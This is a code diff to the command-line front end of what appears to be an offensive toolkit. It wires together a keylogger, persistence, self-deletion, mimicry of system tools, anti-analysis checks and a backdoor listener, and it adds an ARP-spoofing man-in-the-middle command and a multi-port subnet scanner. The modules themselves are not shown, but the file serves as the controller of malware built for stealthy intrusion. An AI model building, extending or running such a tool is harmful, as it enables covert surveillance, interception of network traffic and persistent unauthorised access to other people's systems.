@@ -12,9 +12,10 @@ from modules.audio_steganography import encode_audio, decode_audio
 from modules.polyglot import create_polyglot
 from modules.keylogger import start_keylogger
 from modules.system import add_persistence, mimic_system_tool, self_delete
-from modules.scanner import scan_subnet
+from modules.scanner import intelligent_scan
 from modules.anti_analysis import run_anti_analysis_checks
 from modules.discovery import discover_files
+from modules.mitm import start_arp_spoof
 from modules.wizard import encode_wizard
 
 def load_config(config_path='config.json'):
@@ -104,9 +105,14 @@ def main():
     persist_parser = subparsers.add_parser("persist", help="Add persistence")
 
     # Scanner
-    scan_parser = subparsers.add_parser("scan", help="Scan a subnet")
+    scan_parser = subparsers.add_parser("scan", help="Run an intelligent scan on a subnet")
     scan_parser.add_argument("--subnet", required=True, help="Subnet to scan (e.g., 192.168.1.)")
-    scan_parser.add_argument("--port", type=int, required=True, help="Port to scan for")
+    scan_parser.add_argument("--ports", nargs='+', type=int, help="Specific ports to scan (optional)")
+
+    # MITM
+    mitm_parser = subparsers.add_parser("mitm", help="Perform a Man-in-the-Middle attack")
+    mitm_parser.add_argument("--target", required=True, help="Target IP address")
+    mitm_parser.add_argument("--gateway", required=True, help="Gateway IP address")
 
     # Backdoor
     backdoor_parser = subparsers.add_parser("backdoor", help="Start the backdoor listener")
@@ -213,7 +219,12 @@ def main():
             add_persistence(script_path)
 
         elif args.command == "scan":
-            scan_subnet(args.subnet, args.port)
+            results = intelligent_scan(args.subnet, args.ports)
+            for host in results:
+                print(f"IP: {host['ip']}, Ports: {host['open_ports']}, Score: {host['threat_score']}")
+
+        elif args.command == "mitm":
+            start_arp_spoof(args.target, args.gateway)
 
         elif args.command == "backdoor":
             backdoor_listener(args.port, args.password)
